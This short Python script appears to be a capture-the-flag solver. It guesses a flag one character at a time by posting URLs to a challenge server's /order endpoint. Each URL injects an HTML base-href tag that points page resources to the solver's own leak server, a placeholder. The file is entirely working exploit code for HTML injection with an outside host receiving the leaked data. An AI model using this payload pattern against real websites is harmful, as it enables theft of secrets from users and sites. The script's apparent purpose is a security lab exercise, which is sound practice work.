import requests

TARGET_URL = "http://133.130.96.134:31416"
LEAK_URL = "http://[自身のサーバ]".replace("http:", "").replace("https:", "")

FLAG = ".suku...22."
#FLAG = ".suku...22.cakeuma"

for c in "abcdefghijklmnopqrstuvwxyz.":
    res = requests.post(f"{TARGET_URL}/order", data={"url": f"{TARGET_URL}/?cake={FLAG}{c}|%3Cbase%20href={LEAK_URL}%3E"})
    print(res.text)